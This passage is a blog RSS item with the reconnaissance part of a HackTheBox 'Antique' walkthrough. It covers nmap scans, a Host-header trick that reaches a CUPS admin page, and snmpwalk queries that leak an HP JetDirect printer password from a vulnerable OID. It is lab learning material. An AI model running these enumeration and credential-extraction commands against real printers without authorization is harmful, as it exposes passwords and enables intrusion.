<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CUPS on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/cups/</link>
    <description>Recent content in CUPS on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 20 Oct 2021 06:05:34 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/cups/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Antique</title>
      <link>https://fahmifj.github.io/hackthebox/antique/</link>
      <pubDate>Wed, 20 Oct 2021 06:05:34 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/antique/</guid>
      <description>Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a CUPS service on this machine that can be exploited to read arbitrary files in the system.</description>
      <content:encoded><![CDATA[<p>Antique is one of the machines listed in the HTB printer exploitation track. It features a network printer that stores its password in plain text and is readable via SNMP. The password can be used to login into the telnet service, where it allows OS command execution, which can then be abused to gain initial access to the system. There is a <a href="https://www.cups.org/">CUPS</a> service on this machine that can be exploited to read arbitrary files in the system.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SNMP enumeration</li>
<li>Printer Exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Snmpwalk</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<h4 id="tcp">TCP</h4>
<p>For TCP, <code>nmap</code> discovers 3 open ports: FTP on 22, two CUPS http servers (?) on port 9090 and 9797</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ nmap  -p- -oA nmap/all-tcp-antique 10.10.11.107   
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 16:13 EDT
Nmap scan report <span class="k">for</span> 10.10.11.107
Host is up <span class="o">(</span>0.076s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
PORT     STATE SERVICE
23/tcp   open  telnet
9090/tcp open  zeus-admin
9797/tcp open  unknown

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 121.42 seconds
→ kali@kali «antique» «10.10.14.13» 
$ nmap -sC -sV -p 23,9090,9797 -oA nmap/default-script-antique 10.10.11.107 
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 16:29 EDT
Nmap scan report <span class="k">for</span> 10.10.11.107
Host is up <span class="o">(</span>0.052s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
23/tcp   open  telnet?
<span class="p">|</span> fingerprint-strings: 
<span class="p">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
<span class="p">|</span>     JetDirect
<span class="p">|</span>     Password:
<span class="p">|</span>   NULL: 
<span class="p">|</span>_    JetDirect
9090/tcp open  ipp     CUPS 1.6
<span class="p">|</span>_http-server-header: CUPS/1.6
<span class="p">|</span>_http-title: Bad Request - CUPS v1.6.1
9797/tcp open  ipp     CUPS 1.6
<span class="p">|</span>_http-server-header: CUPS/1.6
<span class="p">|</span>_http-title: Bad Request - CUPS v1.6.1
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>10/15%Time<span class="o">=</span>6169E4A5%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
SF:L,F,<span class="s2">&#34;\nHP\x20JetDirect\n\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,19,<span class="s2">&#34;\nHP\x20JetDirect\n\nPa
</span><span class="s2">...[SNIP]...
</span><span class="s2">
</span><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 176.73 seconds
</span></code></pre></div><h4 id="udp">UDP</h4>
<p>For UDP, <code>nmap</code> discovers SNMP on 161.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ sudo nmap -sU --top-ports <span class="m">20</span> -sV -oA nmap/20-udp-antique 10.10.11.107
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-15 17:48 EDT
Nmap scan report <span class="k">for</span> 10.10.11.107
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span>.

PORT      STATE         SERVICE      VERSION
53/udp    open<span class="p">|</span>filtered domain
67/udp    open<span class="p">|</span>filtered dhcps
68/udp    open<span class="p">|</span>filtered dhcpc
69/udp    open<span class="p">|</span>filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   open<span class="p">|</span>filtered netbios-dgm
139/udp   open<span class="p">|</span>filtered netbios-ssn
161/udp   open          snmp         SNMPv1 server <span class="o">(</span>public<span class="o">)</span>
162/udp   closed        snmptrap
445/udp   open<span class="p">|</span>filtered microsoft-ds
500/udp   closed        isakmp
514/udp   open<span class="p">|</span>filtered syslog
520/udp   closed        route
631/udp   open<span class="p">|</span>filtered ipp
1434/udp  open<span class="p">|</span>filtered ms-sql-m
1900/udp  closed        upnp
4500/udp  open<span class="p">|</span>filtered nat-t-ike
49152/udp open<span class="p">|</span>filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 86.95 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-23---ftp">TCP 23 - FTP</h3>
<p>On google JetDirect has blank as default password, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ nc -vn 10.10.11.107 <span class="m">23</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">23</span> <span class="o">(</span>telnet<span class="o">)</span> open

HP JetDirect

 
Password:  
Invalid password
</code></pre></div><h3 id="tcp-9090----cups">TCP 9090 -  CUPS</h3>
<p>Visiting port 9090 on browser displays a bad request message.</p>
<p><div class="img-container"><img src="imgs/image-20211016040206248.png" alt="image-20211016040206248"  /></div>
</p>
<p>But with <code>nc</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ nc -vn 10.10.11.107 <span class="m">9090</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">9090</span> <span class="o">(</span>?<span class="o">)</span> open
GET /

HTTP/0.9 <span class="m">200</span> OK
Date: Fri, <span class="m">15</span> Oct <span class="m">2021</span> 21:00:42 GMT
Server: CUPS/1.6
Content-Language: en_US
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Last-Modified: Thu, <span class="m">13</span> May <span class="m">2021</span> 05:36:41 GMT
Content-Length: <span class="m">3792</span>

&lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 4.0 Transitional//EN&#34;</span> <span class="s2">&#34;http://www.w3.org/TR/html4/loose.dtd&#34;</span>&gt;
&lt;HTML&gt;
&lt;HEAD&gt;
        &lt;META HTTP-EQUIV<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">CONTENT</span><span class="o">=</span><span class="s2">&#34;text/html; charset=utf-8&#34;</span>&gt;
        &lt;TITLE&gt;Home - CUPS 1.6.1&lt;/TITLE&gt;
        &lt;LINK <span class="nv">REL</span><span class="o">=</span><span class="s2">&#34;STYLESHEET&#34;</span> <span class="nv">TYPE</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/cups.css&#34;</span>&gt;
        &lt;LINK <span class="nv">REL</span><span class="o">=</span><span class="s2">&#34;SHORTCUT ICON&#34;</span> <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/images/cups-icon.png&#34;</span> <span class="nv">TYPE</span><span class="o">=</span><span class="s2">&#34;image/png&#34;</span>&gt;
&lt;/HEAD&gt;
&lt;BODY&gt;
&lt;TABLE <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;page&#34;</span> <span class="nv">SUMMARY</span><span class="o">=</span><span class="s2">&#34;{title}&#34;</span>&gt;
&lt;TR&gt;&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;body&#34;</span>&gt;
&lt;TABLE <span class="nv">BORDER</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">CELLPADDING</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">CELLSPACING</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">SUMMARY</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
&lt;TR <span class="nv">HEIGHT</span><span class="o">=</span><span class="s2">&#34;36&#34;</span>&gt;
&lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/&#34;</span> <span class="nv">TARGET</span><span class="o">=</span><span class="s2">&#34;_blank&#34;</span>&gt;&lt;IMG
<span class="nv">SRC</span><span class="o">=</span><span class="s2">&#34;/images/left.gif&#34;</span> <span class="nv">WIDTH</span><span class="o">=</span><span class="s2">&#34;64&#34;</span> <span class="nv">HEIGHT</span><span class="o">=</span><span class="s2">&#34;36&#34;</span> <span class="nv">BORDER</span><span class="o">=</span><span class="s2">&#34;0&#34;</span> <span class="nv">ALT</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;sel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Home<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/admin&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Administration<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/classes/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Classes<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/help/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Online<span class="p">&amp;</span>nbsp<span class="p">;</span>Help<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/jobs/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Jobs<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span>&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;/printers/&#34;</span>&gt;<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>Printers<span class="p">&amp;</span>nbsp<span class="p">;&amp;</span>nbsp<span class="p">;</span>&lt;/A&gt;&lt;/TD&gt;
&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;unsel&#34;</span> <span class="nv">WIDTH</span><span class="o">=</span><span class="s2">&#34;100%&#34;</span>&gt;&lt;FORM <span class="nv">ACTION</span><span class="o">=</span><span class="s2">&#34;/help/&#34;</span> <span class="nv">METHOD</span><span class="o">=</span><span class="s2">&#34;GET&#34;</span>&gt;&lt;INPUT
<span class="nv">TYPE</span><span class="o">=</span><span class="s2">&#34;SEARCH&#34;</span> <span class="nv">NAME</span><span class="o">=</span><span class="s2">&#34;QUERY&#34;</span> <span class="nv">SIZE</span><span class="o">=</span><span class="s2">&#34;20&#34;</span> <span class="nv">PLACEHOLDER</span><span class="o">=</span><span class="s2">&#34;Search Help&#34;</span>
<span class="nv">AUTOSAVE</span><span class="o">=</span><span class="s2">&#34;org.cups.help&#34;</span> <span class="nv">RESULTS</span><span class="o">=</span><span class="s2">&#34;20&#34;</span>&gt;&lt;/FORM&gt;&lt;/TD&gt;
&lt;TD&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s2">&#34;/images/right.gif&#34;</span> <span class="nv">WIDTH</span><span class="o">=</span><span class="s2">&#34;4&#34;</span> <span class="nv">HEIGHT</span><span class="o">=</span><span class="s2">&#34;36&#34;</span> <span class="nv">ALT</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/TABLE&gt;

&lt;TABLE <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;indent&#34;</span> <span class="nv">SUMMARY</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
&lt;TR&gt;&lt;TD <span class="nv">STYLE</span><span class="o">=</span><span class="s2">&#34;padding-right: 20px;&#34;</span>&gt;

&lt;H1&gt;CUPS 1.6.1&lt;/H1&gt;

&lt;P&gt;CUPS is the standards-based, open <span class="nb">source</span> printing system developed by
&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.apple.com/&#34;</span>&gt;Apple Inc.&lt;/A&gt; <span class="k">for</span> OS&lt;SUP&gt;<span class="p">&amp;</span>reg<span class="p">;</span>&lt;/SUP&gt; X and
other UNIX&lt;SUP&gt;<span class="p">&amp;</span>reg<span class="p">;</span>&lt;/SUP&gt;-like operating systems.&lt;/P&gt;

&lt;/TD&gt;
&lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/&#34;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s2">&#34;images/cups-icon.png&#34;</span> <span class="nv">WIDTH</span><span class="o">=</span><span class="s2">&#34;128&#34;</span>
<span class="nv">HEIGHT</span><span class="o">=</span><span class="s2">&#34;128&#34;</span> <span class="nv">ALT</span><span class="o">=</span><span class="s2">&#34;CUPS&#34;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/TABLE&gt;

&lt;TABLE <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;indent&#34;</span> <span class="nv">SUMMARY</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;
&lt;TR&gt;&lt;TD <span class="nv">VALIGN</span><span class="o">=</span><span class="s2">&#34;top&#34;</span> <span class="nv">STYLE</span><span class="o">=</span><span class="s2">&#34;border-right: dotted thin #cccccc; padding-right: 20px;&#34;</span>&gt;

&lt;H2&gt;CUPS <span class="k">for</span> Users&lt;/H2&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/overview.html&#34;</span>&gt;Overview of CUPS&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/options.html&#34;</span>&gt;Command-Line Printing and Options&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/whatsnew.html&#34;</span>&gt;What<span class="err">&#39;</span>s New in CUPS 1.6&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/newsgroups.php?gcups.general&#34;</span>&gt;User Forum&lt;/A&gt;&lt;/P&gt;

&lt;/TD&gt;&lt;TD <span class="nv">VALIGN</span><span class="o">=</span><span class="s2">&#34;top&#34;</span> <span class="nv">STYLE</span><span class="o">=</span><span class="s2">&#34;border-right: dotted thin #cccccc; padding-left: 20px; padding-right: 20px;&#34;</span>&gt;

&lt;H2&gt;CUPS <span class="k">for</span> Administrators&lt;/H2&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span>&gt;Adding Printers and Classes&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/policies.html&#34;</span>&gt;Managing Operation Policies&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/accounting.html&#34;</span>&gt;Printer Accounting Basics&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/security.html&#34;</span>&gt;Server Security&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/kerberos.html&#34;</span>&gt;Using Kerberos Authentication&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/network.html&#34;</span>&gt;Using Network Printers&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/ref-cupsd-conf.html&#34;</span>&gt;cupsd.conf Reference&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/ppd.php&#34;</span>&gt;Find Printer Drivers&lt;/A&gt;&lt;/P&gt;

&lt;/TD&gt;&lt;TD <span class="nv">VALIGN</span><span class="o">=</span><span class="s2">&#34;top&#34;</span> <span class="nv">STYLE</span><span class="o">=</span><span class="s2">&#34;padding-left: 20px;&#34;</span>&gt;

&lt;H2&gt;CUPS <span class="k">for</span> Developers&lt;/H2&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-overview.html&#34;</span>&gt;Introduction to CUPS Programming&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-cups.html&#34;</span>&gt;CUPS API&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-filter.html&#34;</span>&gt;Filter and Backend Programming&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-httpipp.html&#34;</span>&gt;HTTP and IPP APIs&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-ppd.html&#34;</span>&gt;PPD API&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/api-raster.html&#34;</span>&gt;Raster API&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;help/ref-ppdcfile.html&#34;</span>&gt;PPD Compiler Driver Information File Reference&lt;/A&gt;&lt;/P&gt;

&lt;P&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.cups.org/newsgroups.php?gcups.development&#34;</span>&gt;Developer Forum&lt;/A&gt;&lt;/P&gt;

&lt;/TD&gt;&lt;/TR&gt;
&lt;/TABLE&gt;

&lt;/TD&gt;&lt;/TR&gt;
&lt;TR&gt;&lt;TD&gt;<span class="p">&amp;</span>nbsp<span class="p">;</span>&lt;/TD&gt;&lt;/TR&gt;
&lt;TR&gt;&lt;TD <span class="nv">CLASS</span><span class="o">=</span><span class="s2">&#34;trailer&#34;</span>&gt;CUPS and the CUPS logo are trademarks of
&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&#34;http://www.apple.com&#34;</span>&gt;Apple Inc.&lt;/A&gt; CUPS is copyright 2007-2012 Apple
Inc. All rights reserved.&lt;/TD&gt;&lt;/TR&gt;
&lt;/TABLE&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</code></pre></div><p>According to <a href="https://stackoverflow.com/questions/54806076/cups-bad-request">this thread</a> on StackOverflow, CUPS only allows connection from localhost. But that&rsquo;s a bit weird because the server answered the GET request I sent from netcat.</p>
<p><div class="img-container"><img src="imgs/image-20211016040515575.png" alt="image-20211016040515575"  /></div>
</p>
<p>So I modified my HTTP host header value to 127.0.0.1 with <a href="https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/">this extension</a>, and then I refreshed the page.</p>
<p><div class="img-container"><img src="imgs/image-20211016040848654.png" alt="image-20211016040848654"  /></div>
</p>
<p>It worked 😮.</p>
<p>Among all the menus, &ldquo;administration&rdquo; is the one that&rsquo;s interesting.</p>
<p><div class="img-container"><img src="imgs/image-20211016041744700.png" alt="image-20211016041744700"  /></div>
</p>
<p>I can access all the buttons, including the edit configuration file button , but to modify the config, I will need a valid credentials.</p>
<p><div class="img-container"><img src="imgs/image-20211016043606267.png" alt="image-20211016043606267"  /></div>
</p>
<h3 id="tcp-9797---cups">TCP 9797 - CUPS</h3>
<p>This port also an HTTP server, so I can use <code>netcat</code> as well, but then the response looks familiar.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ nc -vn 10.10.11.107 <span class="m">9797</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">9797</span> <span class="o">(</span>?<span class="o">)</span> open
GET /

HTTP/0.9 <span class="m">200</span> OK 
Date: Fri, <span class="m">15</span> Oct <span class="m">2021</span> 21:18:29 GMT
Server: CUPS/1.6
Content-Language: en_US
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Last-Modified: Thu, <span class="m">13</span> May <span class="m">2021</span> 05:36:41 GMT
Content-Length: <span class="m">3792</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>Turns out that this port return the same response as on port 9090.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ <span class="nb">echo</span> -e <span class="s1">&#39;GET /\n&#39;</span> <span class="p">|</span> nc -vn 10.10.11.107 <span class="m">9797</span> &gt; /dev/null <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -e <span class="s1">&#39;GET /\n&#39;</span> <span class="p">|</span> nc -vn 10.10.11.107 <span class="m">9090</span> &gt; /dev/null <span class="p">|</span> wc -c
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">9797</span> <span class="o">(</span>?<span class="o">)</span> open
<span class="m">3999</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.107<span class="o">]</span> <span class="m">9090</span> <span class="o">(</span>?<span class="o">)</span> open
<span class="m">3999</span>
</code></pre></div><h3 id="udp-161---snmp">UDP 161 - SNMP</h3>
<p>I recently had encountered SNMP in <a href="hackthebox/pit/">HTB: Pit</a>, so since it&rsquo;s hierarchical, I tried to do something like path traversal, and here&rsquo;s what I got:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ snmpwalk -v 2c -c public 10.10.11.107                                 
iso.3.6.1.2.1 <span class="o">=</span> STRING: <span class="s2">&#34;HTB Printer&#34;</span>
→ kali@kali «antique» «10.10.14.13» 
$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1.2                  
iso.3.6.1.2.1 <span class="o">=</span> STRING: <span class="s2">&#34;HTB Printer&#34;</span>
→ kali@kali «antique» «10.10.14.13» 
$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1  
iso.3.6.1.2.1 <span class="o">=</span> STRING: <span class="s2">&#34;HTB Printer&#34;</span>
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 <span class="o">=</span> BITS: <span class="m">50</span> <span class="m">40</span> <span class="m">73</span> <span class="m">73</span> <span class="m">77</span> <span class="m">30</span> <span class="m">72</span> <span class="m">64</span> <span class="m">40</span> <span class="m">31</span> <span class="m">32</span> <span class="m">33</span> <span class="m">21</span> <span class="m">21</span> <span class="m">31</span> <span class="m">32</span> 
<span class="m">33</span> <span class="m">1</span> <span class="m">3</span> <span class="m">9</span> <span class="m">17</span> <span class="m">18</span> <span class="m">19</span> <span class="m">22</span> <span class="m">23</span> <span class="m">25</span> <span class="m">26</span> <span class="m">27</span> <span class="m">30</span> <span class="m">31</span> <span class="m">33</span> <span class="m">34</span> <span class="m">35</span> <span class="m">37</span> <span class="m">38</span> <span class="m">39</span> <span class="m">42</span> <span class="m">43</span> <span class="m">49</span> <span class="m">50</span> <span class="m">51</span> <span class="m">54</span> <span class="m">57</span> <span class="m">58</span> <span class="m">61</span> <span class="m">65</span> <span class="m">74</span> <span class="m">75</span> <span class="m">79</span> <span class="m">82</span> <span class="m">83</span> <span class="m">86</span> <span class="m">90</span> <span class="m">91</span> <span class="m">94</span> <span class="m">95</span> <span class="m">98</span> <span class="m">103</span> <span class="m">106</span> <span class="m">111</span> <span class="m">114</span> <span class="m">115</span> <span class="m">119</span> <span class="m">122</span> <span class="m">123</span> <span class="m">126</span> <span class="m">130</span> <span class="m">131</span> <span class="m">134</span> <span class="m">135</span> 
</code></pre></div><p>The last response is interesting, and it&rsquo;s a password.</p>
<p><div class="img-container"><img src="imgs/image-20211016051117785.png" alt="image-20211016051117785"  /></div>
</p>
<p>Based on <a href="https://book.hacktricks.xyz/pentesting/pentesting-printers/credentials-disclosure-brute-force">HackTrick</a>, it&rsquo;s a vulnerable OID that will returns printer&rsquo;s password when queried.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «antique» «10.10.14.13» 
$ snmpwalk -v 2c -c public 10.10.11.107 iso.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 <span class="o">=</span> BITS: <span class="m">50</span> <span class="m">40</span> <span class="m">73</span> <span class="m">73</span> <span class="m">77</span> <span class="m">30</span> <span class="m">72</span> <span class="m">64</span> <span class="m">40</span> <span class="m">31</span> <span class="m">32</span> <span class="m">33</span> <span class="m">21</span> <span class="m">21</span> <span class="m">31</span> <span class="m">32</span> 
<span class="m">33</span> <span class="m">1</span> <span class="m">3</span> <span class="m">9</span> <span class="m">17</span> <span class="m">18</span> <span class="m">19</span> <span class="m">22</span> <span class="m">23</span> <span class="m">25</span> <span class="m">26</span> <span class="m">27</span> <span class="m">30</span> <span class="m">31</span> <span class="m">33</span> <span class="m">34</span> <span class="m">35</span> <span class="m">37</span> <span class="m">38</span> <span class="m">39</span> <span class="m">42</span> <span class="m">43</span> <span class="m">49</span> <span class="m">50</span> <span class="m">51</span> <span class="m">54</span> <span class="m">57</span> <span class="m">58</span> <span class="m">61</span> <span class="m">65</span> <span class="m">74</span> <span class="m">75</span> <span class="m">79</span> <span class="m">82</span> <span class="m">83</span> <span class="m">86</span> <span class="m">90</span> <span class="m">91</span> <span class="m">94</span> <span class="m">95</span> <span class="m">98</span> <span class="m">103</span> <span class="m">106</span> <span class="m">111</span> <span class="m">114</span> <span class="m">115</span> <span class="m">119</span> <span class="m">122</span> <span class="m">123</span> <span class="m">126</span> <span class="m">130</span> <span class="m">131</span> <span class="m">134</span> <span class="m">135</span>
</code></pre></div><h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
